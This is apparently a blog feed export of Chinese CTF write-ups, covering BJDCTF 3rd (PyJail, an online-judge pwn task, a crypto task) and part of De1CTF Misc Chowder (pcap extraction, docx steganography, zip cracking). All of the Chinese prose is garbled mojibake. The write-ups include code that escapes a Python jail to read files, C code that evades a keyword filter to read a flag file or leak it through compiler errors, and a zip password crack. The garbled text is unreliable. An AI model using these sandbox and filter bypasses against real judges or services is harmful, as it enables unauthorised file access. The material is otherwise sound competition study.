punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">"op"</span><span class="token operator">+</span><span class="token string">"en"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'bjdpyjail.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200524132730843.png" alt="è¯»å–æºç "></p><p>é¢„æœŸè§£è¯¦è§å‡ºé¢˜å¸ˆå‚… Y1ng å¸ˆå‚…çš„è¿™ä¸€ç¯‡ï¼š</p><p><a href="https://www.gem-love.com/ctf/2345.html">[è¯‘]PlaidCTFä¸­ä¸€é“PyJailé€ƒé€¸é¢˜ç›®åˆ†æ</a></p><br><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="TaQiniOJ-0"><a href="#TaQiniOJ-0" class="headerlink" title="TaQiniOJ-0"></a>TaQiniOJ-0</h3><blockquote><p>æ¬¢è¿æ¥åˆ°TaQiniçš„Cè¯­è¨€æ–°æ‰‹è®­ç»ƒè¥</p><p>ï¼ˆæ²¡æœ‰é™„ä»¶ï¼Œç›²æ‰“ï¼‰</p><p>183.129.189.60:10075,10076,10077,10078,10079,10080</p></blockquote><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200523215022417.png" alt="taqinioj"></p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200523215138676.png" alt="oj2"></p><p>è¿™é‡Œå‘Šè¯‰äº†flagæ‰€åœ¨ç›®å½•ä¸º <code>/home/ctf/flag</code>ã€‚</p><p>å¥½ä¹…æ²¡å†™Cäº†ï¼Œçªç„¶éƒ½å¿˜è®°æ–‡ä»¶æ“ä½œäº†ã€‚è¢« python çš„<code>open</code>æƒ¯åäº†å”‰ã€‚</p><p>è¯•äº†ä¸€ä¸‹ï¼Œè¿˜æœ‰ defender å”‰ã€‚<code>flag</code>è¢«è¿‡æ»¤äº†ã€‚</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   FILE <span class="token operator">*</span>fp<span class="token punctuation">;</span><span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/home/ctf/fl"</span><span class="token punctuation">;</span><span class="token keyword">char</span> tmp<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello TaQini"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">strcat</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">"ag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span> fp<span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fscanf</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> <span class="token string">"%s"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>@</code></pre><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200523220959266.png" alt="defender"></p><p>å‘ç°å¥½åƒæ•æ„Ÿè¯ä¸ä»…ä»…æ˜¯<code>flag</code>ï¼Œè¿˜æœ‰<code>home</code>å•¥çš„â€¦â€¦ç„¶è€Œèµ›åæ‰å‘ç°ï¼Œæ°”æ­»æˆ‘äº†ã€‚</p><p>å¯ä»¥<code>sprintf</code>æ¥æ‹¼æ¥å­—ç¬¦ä¸²ã€‚</p><p>ï¼ˆæƒ³èµ·æ¥æŸæ¬¡åšé¡¹ç›®ç»™å•ç‰‡æœºç¼–ç¨‹å°±é è¿™ç©æ„æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œè¢« python æƒ¯åçš„æˆ‘å†™çš„éš¾å—æ­»äº†ã€‚</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>name<span class="token punctuation">,</span> <span class="token string">"%s%s%s%s%s"</span><span class="token punctuation">,</span> <span class="token string">"/hom"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">,</span><span class="token string">"/ct"</span><span class="token punctuation">,</span> <span class="token string">"f/f"</span><span class="token punctuation">,</span> <span class="token string">"lag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å½“ç„¶è¿˜å¯ä»¥ç›´æ¥ç”¨å­—ç¬¦æ•°ç»„èµ‹å€¼çš„æ–¹æ³•ã€‚</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'h'</span><span class="token punctuation">,</span><span class="token string">'o'</span><span class="token punctuation">,</span><span class="token string">'m'</span><span class="token punctuation">,</span><span class="token string">'e'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">,</span><span class="token string">'t'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token string">'f'</span><span class="token punctuation">,</span><span class="token string">'l'</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token string">'g'</span><span class="token punctuation">,</span><span class="token string">'\0'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p>èµ›åç¾¤é‡Œæœ‰å¤§ä½¬ç»™å‡ºäº†å¦‚ä¸‹çš„<strong>éé¢„æœŸè§£</strong>ï¼Œå¤ªä½©æœäº†ï¼</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token expression">"<span class="token operator">/</span>home<span class="token operator">/</span>ctf<span class="token operator">/</span>fl\\</span></span>ag"</code></pre><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200524013637088.png" alt="éé¢„æœŸè§£"></p><p>å“‡å‘œï¼Œç”¨æŠ¥é”™æ¥å¼¹flagï¼è™½ç„¶ä¹‹å‰å†™é”™è¯­æ³•ä¹ŸæŠ¥é”™äº†ï¼Œä½†è¿™è„‘æ´çœŸæ²¡æƒ³åˆ°ã€‚æœç„¶æ˜¯ OJ å¤§ä½¬ã€‚</p><p>åŒæ ·æ¼æ´å¯ç”¨äºå¦ä¸€ä¸ª OJ é¢˜ã€‚</p><br><hr><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="bbcrypto"><a href="#bbcrypto" class="headerlink" title="bbcrypto"></a>bbcrypto</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> A<span class="token punctuation">,</span>SALT<span class="token keyword">from</span> itertools <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> si<span class="token punctuation">)</span><span class="token punctuation">:</span>    c<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        c<span class="token operator">+=</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> a <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token builtin">next</span><span class="token punctuation">(</span>si<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> c<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    m <span class="token operator">=</span> <span class="token string">'flag{********************************}'</span>    a <span class="token operator">=</span> A    salt <span class="token operator">=</span> SALT    <span class="token keyword">assert</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>salt<span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">assert</span><span class="token punctuation">(</span>salt<span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    si <span class="token operator">=</span> cycle<span class="token punctuation">(</span>salt<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"æ˜æ–‡å†…å®¹ä¸ºï¼š"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š"</span><span class="token punctuation">)</span>    c<span class="token operator">=</span>encrypt<span class="token punctuation">(</span>m<span class="token punctuation">,</span> a<span class="token punctuation">,</span> si<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    <span class="token comment">#åŠ å¯†åçš„å¯†æ–‡ä¸ºï¼š</span>    <span class="token comment">#177401504b0125272c122743171e2c250a602e3a7c206e014a012703273a3c0160173a73753d</span></code></pre><p>é€šè¿‡<code>assert</code>å¯ä»¥çŸ¥é“<code>salt</code>æ˜¯ä¸‰ä¸ªå­—æ¯ç»„æˆçš„ã€‚</p><p><code>cycle</code>è¿”å›ä¸€ä¸ªè¿­ä»£å™¨ iteratorï¼Œæ¯ä¸€æ¬¡è°ƒç”¨ <code>next</code> è¿”å›ä¸‹ä¸€ä¸ªå­—ç¬¦ã€‚</p><p>éœ€è¦æ ¹æ® <code>flag{</code>å’Œ <code>}</code> è§£å‡º<code>A</code>å’Œ<code>SALT</code>ï¼Œç„¶åå†ä»£å›å»åè§£ flag ä¸­çš„å­—ç¬¦ã€‚å–æ¨¡çš„è¯æƒ³ä¸åˆ°åˆ«çš„æ–¹æ³•åº”è¯¥ä¹Ÿæ˜¯çˆ†ç ´è§£ã€‚</p><p>è€ƒè™‘æ˜¯çˆ†ç ´æ¥è§£<code>A</code>&amp; <code>SALT</code>ï¼Œç„¶è€Œæˆ‘<code>a</code>çš„çˆ†ç ´èŒƒå›´å¤ªå¤§äº†è®¾åˆ°äº† 1000 ç„¶åå°±æ²¡æ•´å‡ºæ¥â€¦â€¦ï¼ˆï¼ˆ</p><p>èµ›åçœ‹äººå®¶å¤§ä½¬è§£å‡ºæ¥<code>A</code>æ˜¯57ï¼Œ<code>salt</code>æ˜¯<code>ahh</code>ã€‚</p><p><em>ï¼ˆä¹‹åå†å¤ç°8</em></p><br><hr><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ€ç»ˆçš„è§£é¢˜æƒ…å†µå¦‚ä¸‹ã€‚</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200524011922656.png" alt="è§£é¢˜æƒ…å†µ"></p><p>Web çš„å°çº¢èŠ±è¿™ä¹ˆå¤šäººè§£å‡ºæ¥ï¼Œå•Šæ˜¯æˆ‘å¤ªèœäº†ã€‚é¢˜ç›®æŠŠå‡ºç½‘æµé‡å°äº†ï¼Œå¼¹ä¸äº†shellï¼Œèµ›åçœ‹ç¾¤é‡Œå¤§ä½¬ä»¬æ˜¯ç”¨æ—¶é—´ç›²æ³¨æ€¼å‡ºæ¥çš„ã€‚</p><p>æ€»ä¹‹ï¼Œè¿™æ¬¡é¢˜ç›®è´¨é‡æ„Ÿè§‰æŒºé«˜çš„ï¼Œéš¾åº¦æ˜¯çœŸçš„å¤§å¾—äºšæ‰¹ï¼Œä¸¤å¤©æ‰“ä¸‹æ¥æ¯å¤©éƒ½åœ¨è‡ªé—­â€¦â€¦</p><p>è¿™æ¬¡åšé¢˜æ€è·¯æ¯”è¾ƒä¹±ï¼Œå¯èƒ½ä¹Ÿæ¯”è¾ƒä½›ç³»ï¼Œä¸€ä¸‹çœ‹è¿™é¢˜ä¸€ä¸‹çœ‹é‚£é¢˜ï¼Œå™¢åŸæ¥éƒ½ä¸ä¼šåšã€‚<em>ï¼ˆç¾¤é‡ŒèŒæ–°åˆåšå‡ºæ¥äº†ï¼Ÿï¼Ÿï¼Ÿæ‰“æ‰°äº†ã€‚</em></p><p>ç„¶åè¿˜æœ‰å¤§ä½¬ä¸¤å‘¨å­¦ä¼š pwn ç„¶ååšå‡ºäº†ä¸€å †é¢˜ï¼Œè¿™ä¹ˆå®¹æ˜“å…¥é—¨çš„å˜›ï¼Œå¿ƒåŠ¨äº†ã€‚<em>ï¼ˆç®—äº†8ï¼‰</em></p><br><hr><h2 id="CyberChef"><a href="#CyberChef" class="headerlink" title="CyberChef"></a>CyberChef</h2><p>ä¸ºäº†ä¾¿äºæ‰“ CTFï¼Œå‰å¤©æ™šä¸Šåšé¢˜é€”ä¸­è‡ªå·±æ­äº†ä¸ª CyberChefï¼Œæˆ‘æ‰ä¸ä¼šè¯´ä¹‹å‰ä¸€ç›´æƒ³æ­ä½†ä¸€ç›´æ²¡æ•´å‘¢ã€‚</p><p><img src="/2020/05/24/CTF_BJDCTF3rd/image-20200524144909214.png" alt="CyberChef"></p><p>ç½‘å€åœ¨è¿™é‡Œï¼š<a href="https://chef.miaotony.xyz/">https://chef.miaotony.xyz/</a></p><p><strong>ä¸å¸¦å„ç§é¡µé¢ç»Ÿè®¡ï¼Œä¸æ”¶é›†éšç§ä¿¡æ¯ï¼Œæ¬¢è¿æ¥ç©æ¥ BAKE å‘€ï¼</strong></p><p>ç®€è€Œè¨€ä¹‹ï¼Œå®ƒå°±æ˜¯å¯ä»¥å¤„ç†åŒ…æ‹¬ä½†ä¸é™äºå„ç§ç¼–ç å„ç§åŠ å¯†å„ç§è½¬æ¢çš„ä¸€ä¸ªåœ¨çº¿å·¥å…·ï¼Œå¯ä»¥æŠŠä¸€ç³»åˆ—å¤„ç†æµç¨‹æ”¾è¿› èœè°± Recipe é‡Œï¼Œç„¶å BAKE å°±å‡ºç»“æœå•¦ï¼</p><p>ä¸‹é¢æ˜¯å®˜æ–¹çš„ä»‹ç»ã€‚</p><blockquote><p>The Cyber Swiss Army Knife - a web app for encryption, encoding, compression and data analysis</p><p><strong><em>The Cyber Swiss Army Knife</em></strong></p><p>CyberChef is a simple, intuitive web app for carrying out all manner  of â€œcyberâ€ operations within a web browser. These operations include  simple encoding like XOR or Base64, more complex encryption like AES,  DES and Blowfish, creating binary and hexdumps, compression and  decompression of data, calculating hashes and checksums, IPv6 and X.509  parsing, changing character encodings, and much more.</p><p>The tool is designed to enable both technical and non-technical  analysts to manipulate data in complex ways without having to deal with  complex tools or algorithms. It was conceived, designed, built and  incrementally improved by an analyst in their 10% innovation time over  several years.</p><p>å®˜æ–¹ GitHub ä»“åº“<a href="https://github.com/gchq/CyberChef">åœ¨è¿™é‡Œ</a>ã€‚</p></blockquote><p>å¤§æ¦‚å°±è¿™æ ·äº†8</p><p>ï¼ˆæºœ</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | 2020 De1CTF Misc Chowder WriteUp</title>
      <link href="2020/05/04/CTF_2020De1CTF/"/>
      <url>2020/05/04/CTF_2020De1CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="/2020/05/04/CTF_2020De1CTF/b1532fb9c0444888a6b2ce5d56cbf1f5.png"></p><h2 id="å¼•è¨€"><a href="#å¼•è¨€" class="headerlink" title="å¼•è¨€"></a>å¼•è¨€</h2><p><strong>å¥”æ¶Œå§ï¼Œåæµªï¼</strong>ä»Šå¤©æ˜¯äº”å››é’å¹´èŠ‚ï¼Œ<strong>èŠ‚æ—¥å¿«ä¹å‘€ï¼</strong></p><p>è¿™å‡ å¤©æœ‰ä¸ª De1CTFï¼Œäº”ä¸€å‰å‡ å¤©å‡ºå»ç©äº†ï¼Œè€ƒè™‘åˆ°ä»Šå¤©æ—©ä¸Šæ¯”èµ›å°±ç»“æŸäº†ï¼Œäºæ˜¯æ˜¨æ™šæ¥çœ‹äº†ä¸€çœ¼é¢˜ç›®ï¼Œåšäº†ä¸ª <strong>Misc æ‚çƒ©é¢˜</strong>æ¥æ„Ÿå—ä¸€ä¸‹ï¼Œè¿˜æ˜¯æŒºæœ‰æ„æ€çš„ã€‚</p><blockquote><p><strong>De1CTF 2020</strong></p><p>ç«èµ›æ—¶é—´ï¼š 2020-05-02 09:00:00â€”â€”2020-05-04 09:00:00<br>å‚èµ›æ–¹å¼ï¼šç»„é˜Ÿ</p><p>æœ¬å±ŠDe1CTFæ˜¯ç”±XCTFè”èµ›çš„åˆä½œå•ä½De1taæˆ˜é˜Ÿç»„ç»‡ï¼Œç”±èµ›å®ç½‘å®‰æä¾›æŠ€æœ¯æ”¯æŒã€‚ä½œä¸ºç¬¬å…­å±ŠXCTFå›½é™…è”èµ›çš„åˆ†ç«™èµ›ï¼Œæœ¬æ¬¡æ¯”èµ›å°†é‡‡ç”¨åœ¨çº¿ç½‘ç»œå®‰å…¨å¤ºæ——æŒ‘æˆ˜èµ›çš„å½¢å¼ï¼Œé¢å‘å…¨çƒå¼€æ”¾ã€‚</p><p>æ­¤æ¬¡æ¯”èµ›å† å†›é˜Ÿä¼å°†ç›´æ¥æ™‹çº§ç¬¬å…­å±ŠXCTFæ€»å†³èµ›ï¼ˆæ€»å†³èµ›å…·ä½“åœ°ç‚¹æ—¶é—´å¾…å®šï¼Œå°†åœ¨ç¡®å®šåé€šçŸ¥è·å¾—èµ„æ ¼çš„å›½é™…å’Œå›½å†…é˜Ÿä¼ï¼‰ã€‚å…¶ä»–å‚èµ›çš„é˜Ÿä¼ä¹Ÿå°†è·å¾—ç§¯åˆ†ï¼Œæ¥ç«äº‰XCTFå†³èµ›çš„å…¶ä»–å¸­ä½ã€‚</p><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œflagçš„å½¢å¼ä¸ºDe1CTF{this_is_a_sample_flag}ï¼Œè¯·æäº¤åŒ…å«De1CTF{}çš„å®Œæ•´flagï¼Œæ¥è¿›è¡Œå¾—åˆ†ï¼›å¦‚æœflagæ˜¯å…¶ä»–å½¢å¼ï¼Œé¢˜ç›®ä¸­ä¼šé˜æ˜ã€‚</p><p>æ¯”èµ›å¹³å°ï¼š <a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn</a></p></blockquote><p>é¢å‘å…¨çƒå¼€æ”¾å¯è¿˜è¡Œï¼Œäºæ˜¯ä¹æ¯”èµ›é¢˜ç›®éƒ½åŒè¯­çš„ï¼Œè¿˜ç”¨äº† Google Drive åšé™„ä»¶å­˜å‚¨ã€‚çœ‹äº†ä¸€ä¸‹æ’è¡Œæ¦œï¼Œæ­ªæœå¸ˆå‚…ä»¬è´¼å‰å®³å•Šã€‚</p><p>æœ€åé¡ºä¾¿<strong>æ€»ç»“äº†ä¸€ä¸‹å…³äº NTFS äº¤æ¢æ•°æ®æµçš„ç›¸å…³åº”ç”¨</strong>å§ã€‚</p><br><hr><h2 id="Miscæ‚çƒ©-Misc-Chowder"><a href="#Miscæ‚çƒ©-Misc-Chowder" class="headerlink" title="Miscæ‚çƒ©/Misc Chowder"></a>Miscæ‚çƒ©/Misc Chowder</h2><blockquote><p><a href="https://drive.google.com/file/d/1-SrQ8JbD8zAQNVlvuwu3T2Lbu_o1knRQ/view?usp=sharing">https://drive.google.com/file/d/1-SrQ8JbD8zAQNVlvuwu3T2Lbu_o1knRQ/view?usp=sharing</a></p><p><strong>Hints:</strong></p><p>æµé‡åŒ…ä¸­çš„ç½‘ç»œè¿æ¥å¯¹è§£é¢˜æ²¡æœ‰å¸®åŠ© The network connection in pcap is not helping to the challenge</p><p>ä¸éœ€è¦è®¿é—®æµé‡é‡Œä»»ä½•ä¸€ä¸ªçš„æœåŠ¡å™¨åœ°å€ï¼Œæ‰€æœ‰æ•°æ®éƒ½å¯ä»¥ä»æµé‡åŒ…é‡Œç›´æ¥æå– Do not need to connect the network, every data can be extracted from the pcap</p><p>In the burst test point of compressed packet password, the length of the  password is 6, and the first two characters are â€œDâ€ and â€œEâ€.  å‹ç¼©åŒ…å¯†ç æš´ç ´è€ƒç‚¹ä¸­ï¼Œå¯†ç çš„é•¿åº¦ä¸º6ä½ï¼Œå‰ä¸¤ä½ä¸ºDEã€‚</p></blockquote><h3 id="ç½‘ç»œæµé‡æå–"><a href="#ç½‘ç»œæµé‡æå–" class="headerlink" title="ç½‘ç»œæµé‡æå–"></a>ç½‘ç»œæµé‡æå–</h3><p>é¦–å…ˆ Google Drive ä¸‹è½½ä¸‹æ¥æ˜¯ä¸ªæµé‡æŠ“åŒ…æ–‡ä»¶ <code>Misc_Chowder.pcap</code>ã€‚</p><p>æ ¹æ®æç¤ºï¼Œç½‘ç»œè¿æ¥å’ŒæœåŠ¡å™¨åœ°å€éƒ½æ²¡ç”¨çš„ï¼Œé‚£ç›´æ¥å¯¼å‡º HTTP å¯¹è±¡å¥½äº†ã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504174624485.png" alt="httpå¯¹è±¡"></p><p>æŒ‰ç…§å¤§å°æ’åºå‘ç°æ˜¯ä¸Šä¼ æ–‡ä»¶çš„é¡µé¢ï¼Œè¡¨æ ¼é‡Œæ˜¯ä¸Šä¼ çš„æ–‡ä»¶ã€‚</p><p>ä¾æ¬¡æœ‰7å¼ å›¾ç‰‡ï¼Œåˆ†åˆ«å¯¼å‡ºæ¥ã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504174851276.png" alt="å¯¼å‡ºåˆ†ç»„å­—èŠ‚æµ"></p><p>å‰6å¼ æ˜¯æ­£å¸¸çš„å›¾ç‰‡ï¼Œç¬¬7å¼  <code>7.png</code>ï¼Œæ˜¯ä¸€ä¸ª Google Drive çš„åˆ†äº«åœ°å€ã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/7.png" alt="7.png"></p><p>ä¹Ÿå°±æ˜¯</p><blockquote><p><a href="https://drive.google.com/file/d/1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX/view">https://drive.google.com/file/d/1JBdPj7eRaXuLCTFGn7AluAxmxQ4k1jvX/view</a></p></blockquote><p>ï¼ˆè¿™é‡Œæœ€å¼€å§‹æˆ‘æ•°å­—<code>1</code>å’Œå­—æ¯<code>l</code>æ²¡åˆ†æ¸…æ¥šï¼Œäºæ˜¯è®¿é—®äº†æ²¡åˆ†äº«æ–‡ä»¶ï¼Œä»”ç»†çœ‹äº†æ‰å‘ç°â€¦â€¦</p><h3 id="Word-éšå†™"><a href="#Word-éšå†™" class="headerlink" title="Word éšå†™"></a>Word éšå†™</h3><p>ä¸‹è½½åè§£å‹å¾—åˆ°ä¸€ä¸ª <code>readme.docx</code>ï¼Œæ‰“å¼€æŠ¥é”™ï¼Œçœ‹æ¥æ–‡ä»¶é‡Œæ”¹äº†å•¥ä¸œè¥¿ã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504175546409.png"></p><p>é€‰æ‹©<code>æ˜¯</code>åå¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼Œçœ‹èµ·æ¥å¥½åƒæ˜¯æ²¡å•¥å…³ç³»ï¼ˆç¡®å®šï¼‰ã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504175819109.png" alt="wordå†…å®¹"></p><p>çœ‹äº†ä¸€ä¸‹æ–‡æœ¬ä¹Ÿæ²¡æœ‰éšè—æ–‡å­—ï¼Œçœ‹æ¥æ˜¯ word å†…å®¹ç”¨å¤„ä¸å¤§ã€‚</p><p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œ<code>.docx</code>æ ¼å¼çš„ word å…¶å®å¯¹åº”ç€ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œé‚£å°±ç”¨å‹ç¼©æ–‡ä»¶æ‰“å¼€çœ‹çœ‹ã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504180118698.png" alt="wordéšå†™"></p><p>å‘ç°ç›´æ¥å°±åœ¨ç›®å½•ä¸‹ï¼Œç®€å•å¹²è„†çœŸå¥½ã€‚</p><h3 id="å‹ç¼©åŒ…å¯†ç æš´ç ´"><a href="#å‹ç¼©åŒ…å¯†ç æš´ç ´" class="headerlink" title="å‹ç¼©åŒ…å¯†ç æš´ç ´"></a>å‹ç¼©åŒ…å¯†ç æš´ç ´</h3><p><code>You_found_me_Orz.zip</code> é‡Œæœ‰ä¸€ä¸ª <code>You_found_me_Orz.jpg</code>ï¼Œé¢˜ç›®ä¸­æœ‰ hint è¯´ å¯†ç çš„é•¿åº¦ä¸º6ä½ï¼Œå‰ä¸¤ä½ä¸º<code>DE</code>ã€‚äºæ˜¯å°±æ¥çˆ†ç ´å¥½äº†ã€‚</p><p>ä½¿ç”¨ <code>DE????</code> è¿›è¡Œæ©ç çˆ†ç ´ï¼Œæœ€å¼€å§‹å…ˆè¯•äº†ä¸€ä¸‹çº¯å¤§å†™å­—æ¯ã€çº¯å°å†™å­—æ¯ã€çº¯æ•°å­—ã€å¤§å°å†™å­—æ¯ç»„åˆï¼Œå‘ç°éƒ½ä¸å¯¹ï¼Œåæ¥è¯•äº†å¤§å†™å­—æ¯å’Œæ•°å­—ç»„åˆï¼Œè·‘äº†ä¸€é˜µå­å¯†ç å‡ºæ¥äº†ã€‚å°±æ˜¯ <code>DE34Q1</code>.</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504180549996.png" alt="å‹ç¼©åŒ…å¯†ç çˆ†ç ´"></p><p>è¯è¯´ä¸ºå•¥è¿™ä¸ªä¸èƒ½è·‘æ»¡ CPUï¼Œæ„Ÿè§‰çˆ†ç ´å¥½æ…¢â€¦â€¦</p><p>æ­£å¥½æœ‰å¸¦ä½¬å‘ç°äº†ä¸€ä¸ªç ´è§£ zip æ–‡ä»¶çš„å·¥å…·/åº“ï¼Œå« <strong>yazc</strong> (Yet Another Zip Cracker).</p><p>ä»“åº“åœ¨è¿™é‡Œï¼š<a href="https://github.com/mferland/libzc">https://github.com/mferland/libzc</a></p><blockquote><p>The libzc library is a simple zip cracking library. It also comes with a command line tool called â€˜yazcâ€™ (Yet Another Zip Cracker).</p></blockquote><p>ä¸è¿‡å¯¹äºæ©ç çˆ†ç ´ï¼Œä¼°è®¡è¦å…ˆç”Ÿæˆä¸€ä¸ªå­—å…¸å†æ¥çˆ†ç ´ã€‚</p><p>è§£å‹åå¾—åˆ°äº†è¿™å¼ å›¾ç‰‡ã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/You_found_me_Orz.jpg" alt="You_found_me_Orz"></p><h3 id="å›¾åƒéšå†™"><a href="#å›¾åƒéšå†™" class="headerlink" title="å›¾åƒéšå†™"></a>å›¾åƒéšå†™</h3><p>æ‹–è¿› 010editor é‡Œçœ‹äº†ä¸€ä¸‹ï¼Œå‘ç°æ–‡ä»¶æ‹¼æ¥äº†ä¸€ä¸ªrarå‹ç¼©åŒ…ã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504181706421.png" alt="å›¾åƒéšå†™"></p><p>foremost æ²¡æå–å‡ºæ¥ï¼Œäºæ˜¯æ‰‹åŠ¨æå–ä¸€æ³¢å¾—åˆ°äº†è¿™ä¸ªå‹ç¼©åŒ…ã€‚</p><p><img src="/2020/05/04/CTF_2020De1CTF/image-20200504181912463.png" alt="rar"></p><p>è§£å‹ä¸Šé¢çš„ rar å‹ç¼©åŒ…ï¼Œå¾—åˆ°çš„<code>flag.txt</code>å†…å®¹å¦‚ä¸‹ï¼š</p><blockquote><p>De1CTF{jaivy say that you almost get me!!! }</p></blockquote><p>å•¥ï¼Ÿï¼Ÿï¼Ÿåˆæœ‰å‡çš„ 